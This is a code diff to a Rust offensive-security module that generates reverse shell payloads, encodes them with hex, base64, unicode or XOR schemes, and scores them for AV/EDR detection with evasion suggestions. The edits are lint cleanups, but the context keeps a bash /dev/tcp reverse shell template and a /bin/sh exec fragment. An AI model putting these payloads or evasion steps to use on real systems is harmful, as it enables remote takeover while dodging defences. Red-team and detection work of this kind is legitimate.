@@ -87,6 +87,7 @@ impl fmt::Display for GeneratedPayload {
 // ─── Shell Generation ────────────────────────────────────────────────────────
 
 /// Generate a reverse shell payload for the given shell type.
+#[must_use]
 pub fn generate_reverse_shell(shell_type: ShellType, lhost: &str, lport: u16) -> GeneratedPayload {
     let payload = match shell_type {
         ShellType::ReverseBash => format!("bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
@@ -157,6 +158,7 @@ exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 // ─── Encoding Functions ──────────────────────────────────────────────────────
 
 /// Encode a payload with the specified encoding.
+#[must_use]
 pub fn encode_payload(payload: &str, encoding: PayloadEncoding) -> String {
     match encoding {
         PayloadEncoding::None => payload.to_string(),
@@ -169,11 +171,11 @@ pub fn encode_payload(payload: &str, encoding: PayloadEncoding) -> String {
 }
 
 fn encode_hex(payload: &str) -> String {
-    payload
-        .bytes()
-        .map(|b| format!("\\x{b:02x}"))
-        .collect::<Vec<_>>()
-        .join("")
+    use std::fmt::Write as _;
+    payload.bytes().fold(String::with_capacity(payload.len() * 4), |mut s, b| {
+        let _ = write!(s, "\\x{b:02x}");
+        s
+    })
 }
 
 fn url_encode(payload: &str) -> String {
@@ -194,9 +196,9 @@ fn base64_encode(payload: &str) -> String {
     let mut result = String::new();
 
     for chunk in bytes.chunks(3) {
-        let b0 = chunk[0] as u32;
-        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
-        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
+        let b0 = u32::from(chunk[0]);
+        let b1 = if chunk.len() > 1 { u32::from(chunk[1]) } else { 0 };
+        let b2 = if chunk.len() > 2 { u32::from(chunk[2]) } else { 0 };
 
         let triple = (b0 << 16) | (b1 << 8) | b2;
 
@@ -218,19 +220,19 @@ fn base64_encode(payload: &str) -> String {
 }
 
 fn unicode_escape(payload: &str) -> String {
-    payload
-        .bytes()
-        .map(|b| format!("\\u{:04x}", b as u16))
-        .collect::<Vec<_>>()
-        .join("")
+    use std::fmt::Write as _;
+    payload.bytes().fold(String::with_capacity(payload.len() * 6), |mut s, b| {
+        let _ = write!(s, "\\u{:04x}", u16::from(b));
+        s
+    })
 }
 
 fn xor_encode(payload: &str, key: u8) -> String {
-    payload
-        .bytes()
-        .map(|b| format!("\\x{:02x}", b ^ key))
-        .collect::<Vec<_>>()
-        .join("")
+    use std::fmt::Write as _;
+    payload.bytes().fold(String::with_capacity(payload.len() * 4), |mut s, b| {
+        let _ = write!(s, "\\x{:02x}", b ^ key);
+        s
+    })
 }
 
 // ─── Payload Analysis ────────────────────────────────────────────────────────
@@ -266,10 +268,12 @@ impl fmt::Display for PayloadAnalysis {
 }
 
 /// Analyze a payload for characteristics that AV/EDR may flag.
+#[must_use]
+#[allow(clippy::cast_precision_loss)]
 pub fn analyze_payload(payload: &str) -> PayloadAnalysis {
     let bytes = payload.as_bytes();
     let length = bytes.len();
-    let null_bytes = bytes.iter().filter(|&&b| b == 0).count();
+    let null_bytes = bytes.iter().fold(0usize, |acc, &b| acc + usize::from(b == 0));
     let printable = bytes
         .iter()
         .filter(|&&b| (0x20..=0x7E).contains(&b))
@@ -328,8 +332,7 @@ pub fn analyze_payload(payload: &str) -> PayloadAnalysis {
     // Null bytes in non-trailing positions are suspicious
     let non_trailing_nulls = bytes[..length.saturating_sub(4)]
         .iter()
-        .filter(|&&b| b == 0)
-        .count();
+        .fold(0usize, |acc, &b| acc + usize::from(b == 0));
     if non_trailing_nulls > 0 {
         shellcode_score += 0.1;
         detections.push(format!("{non_trailing_nulls} null bytes in payload body"));
@@ -375,6 +378,7 @@ impl fmt::Display for EvasionSuggestion {
 }
 
 /// Generate AV evasion suggestions based on payload analysis.
+#[must_use]
 pub fn suggest_evasion(analysis: &PayloadAnalysis) -> Vec<EvasionSuggestion> {
     let mut suggestions = Vec::new();
 
